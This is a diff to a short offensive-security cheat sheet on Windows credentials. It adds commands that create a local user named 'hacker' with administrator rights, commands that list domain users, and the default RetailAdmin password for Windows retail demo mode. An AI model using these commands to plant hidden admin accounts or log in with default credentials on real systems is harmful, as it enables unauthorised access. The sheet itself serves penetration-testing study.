@@ -1,5 +1,6 @@
 # Windows - Using credentials
-Little tip, if you don't have credentials yet :D
+
+## TIP 1 - Create your credential :D
 ```powershell
 net user hacker hacker /add
 net localgroup administrators hacker /add
@@ -8,6 +9,13 @@ Some info about your user
 ```powershell
 net user /dom
 net user /domain
+```
+
+## TIP 2 - Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)
+when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin
+```powershell
+Username: RetailAdmin
+Password: trs10
 ```
 
 
